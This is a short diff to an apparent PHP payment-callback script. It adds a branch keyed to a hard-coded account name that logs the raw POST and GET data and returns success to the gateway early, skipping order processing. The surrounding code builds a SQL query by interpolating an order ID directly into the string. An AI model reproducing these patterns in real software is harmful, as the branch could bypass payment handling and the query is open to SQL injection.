@@ -62,6 +62,11 @@ if (0 == strcasecmp($verrifysign, $sign)){
         $dwFenBaoID = $result_account['dwFenBaoID'];
         $clienttype = $result_account['clienttype'];
     }
+    $loginname = '16yo';
+    if(isOwnWay($PayName,$loginname)){
+    	write_log(ROOT_PATH."log","name_{$loginname}_", "account is $PayName ! post=$post, get=$get, ".date("Y-m-d H:i:s")."\r\n");
+    	exit($success);
+    }
     $conn = SetConn(88);
     $sql = "select rpCode from web_pay_log where OrderID = '$order_id' limit 1";
     $query = @mysqli_query($conn, $sql);
